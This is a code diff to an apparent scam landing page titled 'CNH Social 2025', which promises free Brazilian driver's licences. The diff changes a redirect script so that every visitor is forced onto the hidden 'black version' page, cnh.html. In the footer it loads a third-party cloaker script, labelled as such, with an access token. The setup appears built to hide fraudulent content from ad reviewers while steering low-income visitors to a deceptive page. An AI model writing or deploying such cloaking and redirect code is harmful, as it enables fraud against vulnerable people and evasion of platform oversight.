@@ -7,12 +7,22 @@
   <meta name="description" content="Programa CNH Social 2025 oferece Carteira de Motorista gratuita para brasileiros de baixa renda. Saiba como se inscrever.">
   <title>CNH Social 2025 - Carteira de Motorista Gratuita</title>
   <link rel="stylesheet" href="style.css">
+
+  <!-- Força a query string ?zuck=ativo e executa o redirect -->
   <script>
-    const urlParams = new URLSearchParams(window.location.search);
-    const param = urlParams.get('zuck');
-    if (param === 'ativo') {
-      window.location.href = "/cnh.html";
-    }
+    (function(){
+      const url = new URL(window.location);
+      // 1) Se não há parâmetro "zuck", adiciona e recarrega
+      if (!url.searchParams.has('zuck')) {
+        url.searchParams.set('zuck', 'ativo');
+        window.location.replace(url);
+        return;
+      }
+      // 2) Se "zuck=ativo", redireciona para a versão black
+      if (url.searchParams.get('zuck') === 'ativo') {
+        window.location.href = 'cnh.html';
+      }
+    })();
   </script>
 </head>
 <body>
@@ -41,6 +51,9 @@
   </footer>
 
   <!-- SCRIPT DO CLOAKER -->
-  <script type="text/javascript" src="https://app.cloakeuai.com/api/cloak?token=5d717271a3e143b584094dd92c667b8bc090d682e54243ecae0413f7433b5096"></script>
+  <script
+    type="text/javascript"
+    src="https://app.cloakeuai.com/api/cloak?token=5d717271a3e143b584094dd92c667b8bc090d682e54243ecae0413f7433b5096">
+  </script>
 </body>
 </html>
